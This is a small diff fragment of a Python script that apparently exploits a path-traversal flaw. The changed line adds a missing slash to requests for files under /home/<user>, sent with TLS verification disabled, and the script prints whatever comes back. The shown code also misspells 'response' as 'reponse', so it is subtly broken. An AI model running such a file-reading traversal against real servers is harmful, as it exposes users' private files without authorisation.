@@ -33,7 +33,7 @@ for file in local_files:
         print ("--------------------------------------------------")
 
 for path in user_files:
-    response = requests.get(path_to_traverse+"/home"+ user + path ,headers=headers,verify=False,)
+    response = requests.get(path_to_traverse+"/home/"+ user + path ,headers=headers,verify=False,)
     if reponse.text:
         print ("/home/"+ user + path)
         print (response.text)
